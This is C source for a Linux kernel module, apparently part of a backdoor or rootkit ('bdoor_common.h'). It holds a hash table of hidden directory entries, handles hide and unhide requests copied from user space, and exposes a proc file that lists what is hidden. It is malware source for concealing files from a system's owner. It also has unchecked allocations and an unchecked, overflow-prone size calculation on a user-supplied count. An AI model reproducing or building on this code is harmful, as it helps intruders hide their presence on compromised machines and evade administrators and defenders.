#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/rhashtable.h>
#include "bdoor_common.h"
#include "hidden_entry.h"


#ifdef CONFIG_X86_64

struct rhashtable_params hidden_table_params = {
        .key_len = sizeof(struct dentry_identifier),
        .key_offset = offsetof(struct hidden_entry,id),
        .head_offset = offsetof(struct hidden_entry,node)
};

atomic_t hidden_table_users;
struct rhashtable hidden_table;
spinlock_t hidden_table_lock;

static struct hidden_entry *req_to_entry(struct dentry_identifier *orig_id)
{
        struct hidden_entry *ret = kmalloc(sizeof(struct hidden_entry),GFP_ATOMIC);
        memcpy(&ret->id,orig_id,sizeof(struct dentry_identifier));
        spin_lock_init(&ret->lock);
        return ret;
}

void hidden_table_free_entry(void *ptr, void *arg)
{
        //struct hidden_table *entry = (struct hidden_table*)ptr;
	struct hidden_entry *entry = (struct hidden_entry*)ptr;
        kfree(entry);
}

static void add_hidden_entry_to_table(struct dentry_identifier *identifier)
{
        int err;
        struct hidden_entry *new_entry = req_to_entry(identifier);
        atomic_inc(&hidden_table_users);
        err = rhashtable_lookup_insert_fast(&hidden_table,
                                        &new_entry->node,
                                        hidden_table_params);

        if (err)
                kfree(new_entry);

        atomic_dec(&hidden_table_users);
}

int process_hide_request(struct hide_request *request)
{
        int i;
        int ret = 0;
        struct dentry_identifier *entries = kmalloc(request->count *
                                                sizeof(struct dentry_identifier),
                                                GFP_ATOMIC);
        if (copy_from_user(entries,(struct dentry_identifer*)request->idents,
                                request->count * sizeof(struct dentry_identifier))) {
                ret = 1;
                goto out;
        }
        for (i = 0; i < request->count; i++)
                add_hidden_entry_to_table(&entries[i]);
out:
        kfree(entries);
        return ret;
}

static void rem_hidden_entry_from_table(struct dentry_identifier *old_id)
{
        struct hidden_entry *old_entry;
        atomic_inc(&hidden_table_users);
        old_entry = rhashtable_lookup_fast(&hidden_table,
                                        old_id,
                                        hidden_table_params);
        if (!old_entry)
                goto out;

        rhashtable_remove_fast(&hidden_table,
                        &old_entry->node,
                        hidden_table_params);
        kfree(old_entry);
out:
        atomic_dec(&hidden_table_users);
}

int process_show_request(struct hide_request *request)
{
        int i;
        int ret = 0;
        struct dentry_identifier *entries = kmalloc(request->count *
                                                sizeof(struct dentry_identifier),
                                                GFP_ATOMIC);
        if (copy_from_user(entries,(struct dentry_identifer*)request->idents,
                                request->count * sizeof(struct dentry_identifier))) {
                ret = 1;
                goto out;
        }
        for (i = 0; i < request->count; i++)
                rem_hidden_entry_from_table(&entries[i]);
out:
        kfree(entries);
        return ret;
}

static int hidden_proc_show(struct seq_file *p, void *v)
{
	struct rhashtable_iter iter;
	struct dentry_identifier *dentry_id;
	unsigned long flags;
	seq_printf(p,"%-*s%-*s%-*s\n",
		11,"DEVICE",
		21,"INODE",
		8,"NAME");
	spin_lock_irqsave(&hidden_table_lock,flags);
	atomic_inc(&hidden_table_users);
	rhashtable_walk_enter(&hidden_table,&iter);
	rhashtable_walk_start(&iter);

	while((dentry_id = rhashtable_walk_next(&iter)) != NULL)
	{
		rhashtable_walk_stop(&iter);
		seq_printf(p,"%-*u%-*lu%s\n",
			11,dentry_id->device,
			21,dentry_id->parent_ino,
			dentry_id->name);
		rhashtable_walk_start(&iter);
	}

	rhashtable_walk_stop(&iter);
	rhashtable_walk_exit(&iter);
	atomic_dec(&hidden_table_users);
	spin_unlock_irqrestore(&hidden_table_lock,flags);
	return 0;
}


static int hidden_proc_open(struct inode *inode,struct file *file)
{
        return single_open(file,hidden_proc_show,NULL);
}

const struct proc_ops hidden_ops = {
        .proc_open = hidden_proc_open,
        .proc_read=seq_read,
        .proc_release=single_release,
};

struct proc_dir_entry *hidden_file_viewer;

#endif
